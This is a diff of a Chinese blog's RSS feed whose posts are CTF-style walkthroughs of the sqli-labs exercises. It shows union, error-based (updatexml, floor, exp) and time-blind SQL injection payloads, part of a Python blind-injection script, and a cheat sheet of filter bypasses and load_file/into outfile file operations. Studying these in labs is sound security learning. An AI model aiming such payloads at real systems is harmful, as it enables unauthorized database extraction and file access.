+        res = requests.get(url.format(target, i, j))
+        if &#34;You are in&#34; in res.text:
+            result += str
+            print(result)
+            break
+print(result)
+
+# security
+# emails,referers,uagents,users
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;less-6&#34;&gt;&lt;a href=&#34;#less-6&#34; class=&#34;headerlink&#34; title=&#34;less 6&#34;&gt;&lt;/a&gt;less 6&lt;/h1&gt;&lt;p&gt;与 less5 相比，单引号改为双引号&lt;/p&gt;
+&lt;h1 id=&#34;less-7&#34;&gt;&lt;a href=&#34;#less-7&#34; class=&#34;headerlink&#34; title=&#34;less 7&#34;&gt;&lt;/a&gt;less 7&lt;/h1&gt;&lt;p&gt;相比上一个，起 sql 语句应为 &lt;code&gt;where id = ((&#39;$id&#39;))&lt;/code&gt; ，故闭合一个单引号和两个括号，之后和前面脚本一样&lt;/p&gt;
+&lt;h1 id=&#34;less-8&#34;&gt;&lt;a href=&#34;#less-8&#34; class=&#34;headerlink&#34; title=&#34;less 8&#34;&gt;&lt;/a&gt;less 8&lt;/h1&gt;&lt;p&gt;同 less 5&lt;/p&gt;
+&lt;h1 id=&#34;less-9&#34;&gt;&lt;a href=&#34;#less-9&#34; class=&#34;headerlink&#34; title=&#34;less 9&#34;&gt;&lt;/a&gt;less 9&lt;/h1&gt;&lt;p&gt;不管什么都显示相同，故采用时间盲注 &lt;/p&gt;
+&lt;p&gt;payload：&lt;code&gt;?id=1&#39; and if(ascii(substr({},{},1))={},sleep(1),2)--+&lt;/code&gt;&lt;/p&gt;
+&lt;h1 id=&#34;less-10&#34;&gt;&lt;a href=&#34;#less-10&#34; class=&#34;headerlink&#34; title=&#34;less 10&#34;&gt;&lt;/a&gt;less 10&lt;/h1&gt;&lt;p&gt;第九题改单引号为双引号&lt;/p&gt;
+&lt;h1 id=&#34;less-11&#34;&gt;&lt;a href=&#34;#less-11&#34; class=&#34;headerlink&#34; title=&#34;less 11&#34;&gt;&lt;/a&gt;less 11&lt;/h1&gt;&lt;p&gt;联合查询&lt;/p&gt;
 &lt;p&gt;payload&lt;/p&gt;
-&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;passwd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;admin&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;uname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; union select 1,database()--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;passwd=admin&amp;amp;uname=&#39; &lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;security&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;或者使用报错注入&lt;/p&gt;
-&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;passwd&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;uname&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; and updatexml(0x7e,concat(0x7e,database()),0x7e)--+&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;或者&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;passwd=1&amp;amp;uname=1&#39;&lt;span class=&#34;token keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; group_concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;table_name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;security&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x7e&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;floor&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;x &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;23&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;less-12&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-12&#34;&gt;#&lt;/a&gt; less 12&lt;/h1&gt;
-&lt;p&gt;与 11 相比，闭合使用  &lt;code&gt;&#34;)&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;passwd=admin&amp;amp;uname=&#39; union select 1,database()--+
+passwd=admin&amp;amp;uname=&#39; union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;)--+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;或者使用报错注入&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;passwd=1&amp;amp;uname=1&#39; and updatexml(0x7e,concat(0x7e,database()),0x7e)--+
+或者
+passwd=1&amp;amp;uname=1&#39;union (select 1,2 from(select count(*),concat((select (select (select concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;less-12&#34;&gt;&lt;a href=&#34;#less-12&#34; class=&#34;headerlink&#34; title=&#34;less 12&#34;&gt;&lt;/a&gt;less 12&lt;/h1&gt;&lt;p&gt;与 11 相比，闭合使用 &lt;code&gt;&#34;)&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;其他同&lt;/p&gt;
-&lt;h1 id=&#34;less-13&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#less-13&#34;&gt;#&lt;/a&gt; less 13&lt;/h1&gt;
-&lt;p&gt;闭合使用  &lt;code&gt;&#39;)&lt;/code&gt;  ，使用报错注入，其他无显示&lt;/p&gt;
+&lt;h1 id=&#34;less-13&#34;&gt;&lt;a href=&#34;#less-13&#34; class=&#34;headerlink&#34; title=&#34;less 13&#34;&gt;&lt;/a&gt;less 13&lt;/h1&gt;&lt;p&gt;闭合使用 &lt;code&gt;&#39;)&lt;/code&gt; ，使用报错注入，其他无显示&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -149,36 +237,73 @@
             <category>CTF</category>
             <category>sql注入</category>
             <pubDate>Sun, 28 Aug 2022 13:01:48 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;联合查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#联合查询&#34;&gt;#&lt;/a&gt; 联合查询&lt;/h1&gt;
-&lt;h1 id=&#34;报错注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错注入&#34;&gt;#&lt;/a&gt; 报错注入&lt;/h1&gt;
-&lt;h2 id=&#34;updatexml&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#updatexml&#34;&gt;#&lt;/a&gt; updatexml&lt;/h2&gt;
-&lt;p&gt;example： &lt;code&gt;?id=1&#39;+updatexml(1,concat(0x7e,(select version())),0x7e)%23&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;floor&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#floor&#34;&gt;#&lt;/a&gt; floor&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;floor&lt;/code&gt;  报错的原理是 &lt;code&gt;rand&lt;/code&gt;  和 &lt;code&gt;order by&lt;/code&gt;  或 &lt;code&gt;group by&lt;/code&gt;  的冲突&lt;/p&gt;
+            <description><![CDATA[ &lt;h1 id=&#34;联合查询&#34;&gt;&lt;a href=&#34;#联合查询&#34; class=&#34;headerlink&#34; title=&#34;联合查询&#34;&gt;&lt;/a&gt;联合查询&lt;/h1&gt;&lt;h1 id=&#34;报错注入&#34;&gt;&lt;a href=&#34;#报错注入&#34; class=&#34;headerlink&#34; title=&#34;报错注入&#34;&gt;&lt;/a&gt;报错注入&lt;/h1&gt;&lt;h2 id=&#34;updatexml&#34;&gt;&lt;a href=&#34;#updatexml&#34; class=&#34;headerlink&#34; title=&#34;updatexml&#34;&gt;&lt;/a&gt;updatexml&lt;/h2&gt;&lt;p&gt;example：&lt;code&gt;?id=1&#39;+updatexml(1,concat(0x7e,(select version())),0x7e)%23&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;floor&#34;&gt;&lt;a href=&#34;#floor&#34; class=&#34;headerlink&#34; title=&#34;floor&#34;&gt;&lt;/a&gt;floor&lt;/h2&gt;&lt;p&gt;&lt;code&gt;floor&lt;/code&gt;报错的原理是&lt;code&gt;rand&lt;/code&gt;和&lt;code&gt;order by&lt;/code&gt;或&lt;code&gt;group by&lt;/code&gt;的冲突&lt;/p&gt;
 &lt;p&gt;example：&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;爆破数据库版本信息&lt;/p&gt;
+&lt;li&gt;&lt;p&gt;爆破数据库版本信息&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;?id=1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;爆破数据库名信息&lt;/p&gt;
+&lt;li&gt;&lt;p&gt;爆破数据库名信息&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;?id=1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e)))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&lt;/code&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;分解解释&lt;/p&gt;
-&lt;p&gt;分别将各语句分开，最终得到 &lt;code&gt;select 1 from a&lt;/code&gt; ;&lt;/p&gt;
-&lt;p&gt;而为了让 &lt;code&gt;floor&lt;/code&gt;  中的 &lt;code&gt;rand&lt;/code&gt;  和 &lt;code&gt;order by&lt;/code&gt;  或 &lt;code&gt;group by&lt;/code&gt;  进行冲突，必须存在 &lt;code&gt;floor(rand (0)*2) x group by x&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;分别将各语句分开，最终得到&lt;code&gt;select 1 from a&lt;/code&gt;;&lt;/p&gt;
+&lt;p&gt;而为了让&lt;code&gt;floor&lt;/code&gt;中的&lt;code&gt;rand&lt;/code&gt;和&lt;code&gt;order by&lt;/code&gt;或&lt;code&gt;group by&lt;/code&gt;进行冲突，必须存在&lt;code&gt;floor(rand (0)*2) x group by x&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;编写步骤:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;select 1 from a&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;丰富 &lt;code&gt;a&lt;/code&gt;  的内容&lt;/p&gt;
+&lt;p&gt;丰富&lt;code&gt;a&lt;/code&gt;的内容&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;select 1 from (select count(*),xxx from information_schema.tables group by xxx)a&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;替换上面的 &lt;code&gt;xxx&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;替换上面的&lt;code&gt;xxx&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;select 1 from (select count(*),concat(aaa,floor(rand(0)*2))xxx from information_schema.tables group by xxx)a&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;最后替换 &lt;code&gt;concat&lt;/code&gt;  中的 &lt;code&gt;aaa&lt;/code&gt;  (即为需要获得的信息)&lt;/p&gt;
+&lt;p&gt;最后替换&lt;code&gt;concat&lt;/code&gt;中的&lt;code&gt;aaa&lt;/code&gt;(即为需要获得的信息)&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;select 1 from (select count(*),concat(concat(0x7e,database(),0x7e),floor(rand(0)*2))xxx from information_schema.tables group by xxx)a&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h2&gt;
-&lt;p&gt;example: &lt;code&gt;?id=1&#39; and exp(~(select * from (select user())x))%23&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;example:&lt;code&gt;?id=1&#39; and exp(~(select * from (select user())x))%23&lt;/code&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://dpm12345.cn/posts/78c2084b/</guid>
+            <title>sql_sum</title>
+            <link>http://dpm12345.cn/posts/78c2084b/</link>
+            <category>CTF</category>
+            <category>sql注入</category>
+            <pubDate>Mon, 06 Jun 2022 20:01:48 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;SQL注入&#34;&gt;&lt;a href=&#34;#SQL注入&#34; class=&#34;headerlink&#34; title=&#34;SQL注入&#34;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;正常流程&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select database();&lt;/code&gt;   获取数据库名&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select group_concat(schema_name) from information_schema.schemata;&lt;/code&gt; 获取所有的数据库名&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select group_concat(table_name) from information_schema.tables where table_schema = database();&lt;/code&gt; 获取指定数据库中所有表名&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#39;xxx&#39;;&lt;/code&gt; 获得指定表中的所有字段名&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select group_concat(&#39;xxx&#39;) from dataname.tablename;&lt;/code&gt;  获得指定表中的指定字段的所有内容&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;匹配字符串&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;where xxx = &#39;xxx&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;having xxx = &#39;xxx&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;xxx regexp(&#39;xxx&#39;)&lt;/code&gt; 利用正则匹配&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;substr(str,start,len)&lt;/code&gt; 获取str字符串从start开始(初始下标从1开始)的len个字符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;left(str,len)&lt;/code&gt;、&lt;code&gt;right(str,len)&lt;/code&gt; 从左/右开始数len个字符&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;假设有过滤&lt;ul&gt;
+&lt;li&gt;replace过滤为空: 由于该过滤只将匹配到的进行替换，故可通过双写绕过，如&lt;code&gt;seselectlect&lt;/code&gt;过滤后得到&lt;code&gt;select&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;过滤空格，绕过手段&lt;code&gt;(),%0a,%a0,%0c,%0d,反引号,/**/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;过滤&lt;code&gt;=&lt;/code&gt;，可以使用&lt;code&gt;like&lt;/code&gt;,&lt;code&gt;regexp&lt;/code&gt;正则匹配&lt;/li&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;特殊情况&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select * from &#39;admin&#39; where password=md5($pass,true)&lt;/code&gt;此种情况为使用字符串&lt;code&gt;pass=ffifdyop&lt;/code&gt;,sql接收后会将其hex解码，从而获得&lt;code&gt;&#39; or &#39;6xxxxx&#39;&lt;/code&gt;语句，得到一个永真式，绕过md5判断&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;文件操作&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;select load_file(xxx);&lt;/code&gt; 读文件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;select xxx into outfile &#34;xxx&#34;&lt;/code&gt; 写文件，前提是要有写文件权限&lt;/li&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
  ]]></description>
         </item>
     </channel>
